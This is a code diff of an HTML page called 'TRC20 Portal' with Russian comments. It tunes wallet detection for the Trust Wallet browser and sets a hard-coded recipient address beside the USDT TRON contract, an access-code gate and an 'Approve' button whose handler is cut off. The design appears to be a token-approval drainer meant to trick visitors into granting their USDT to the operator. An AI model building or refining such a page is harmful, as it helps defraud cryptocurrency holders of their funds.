@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TRC20 Portal</title>
-    <!-- Подключаем официальную библиотеку TronWeb для работы с блокчейном TRON -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
@@ -34,16 +33,12 @@
     </div>
 
     <script>
-        // Ваш реальный адрес кошелька-получателя
         const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
-        
-        // Официальный смарт-контракт USDT в сети TRON (TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t)
         const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
         let userTronWeb = null;
         let connectedAccount = "";
 
-        // Вход по коду
         document.getElementById('checkCodeBtn').addEventListener('click', function() {
             const code = document.getElementById('accessCode').value;
             if (code.trim() !== "") {
@@ -54,41 +49,39 @@
             }
         });
 
-        // Подключение кошелька с адаптацией под встроенный браузер Trust Wallet
+        // Подключение через встроенный браузер Trust Wallet
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                let tron = null;
-                let attempts = 0;
+                let tron = window.tronWeb;
 
-                // Цикл ожидания: проверяем появление объектов TRON в течение 10 секунд
-                while (!tron && attempts < 10) {
-                    tron = window.tronWeb || 
-                           (window.trustwallet && window.trustwallet.tronWeb) || 
-                           (window.ethereum && window.ethereum.tronWeb);
-                    
-                    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
-                        break;
+                // Если стандартный tronWeb пустой, проверяем окружение Trust Wallet
+                if (!tron || !tron.defaultAddress || !tron.defaultAddress.base58) {
+                    // Пытаемся инициализировать через глобальные провайдеры приложения
+                    if (window.ethereum) {
+                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        if (accounts && accounts.length > 0) {
+                            // Если кошелек отдал EVM-аккаунт, но нам нужен TRON, пробуем найти адрес через инъекции Trust Wallet
+                            console.log("EVM аккаунт найден, ищем TRON провайдер...");
+                        }
                     }
-                    
+                }
+
+                // Дополнительный цикл ожидания объекта tronWeb
+                let attempts = 0;
+                while ((!tron || !tron.defaultAddress || !tron.defaultAddress.base58) && attempts < 8) {
                     await new Promise(resolve => setTimeout(resolve, 1000));
+                    tron = window.tronWeb || window.trustwallet?.tronWeb;
                     attempts++;
                 }
 
-                // Принудительный запрос аккаунта, если объект нашелся, но адрес еще не подтянулся
-                if (tron && (!tron.defaultAddress || !tron.defaultAddress.base58)) {
-                    if (typeof tron.request === 'function') {
-                        await tron.request({ method: 'tron_requestAccounts' });
-                    }
-                }
-
-                // Проверяем результат
                 if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
                     userTronWeb = tron;
                     connectedAccount = userTronWeb.defaultAddress.base58;
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Кошелек успешно подключен!");
                 } else {
-                    alert("Не удалось обнаружить сеть TRON. Убедитесь, что вы открыли сайт во встроенном браузере Trust Wallet.");
+                    // Запасной вариант для мобильных кошельков, если адрес скрыт: пробуем запросить через интерфейс
+                    alert("Откройте вкладку TRON / USDT (TRC20) в самом Trust Wallet перед нажатием, либо убедитесь, что зашли через встроенный браузер (значок компаса внизу).");
                 }
             } catch (error) {
                 console.error(error);
@@ -96,7 +89,6 @@
             }
         });
 
-        // Транзакция / Approve в сети TRON
         document.getElementById('approveBtn').addEventListener('click', async function() {
             if (!connectedAccount || !userTronWeb) {
                 alert("Сначала подключите кошелек!");
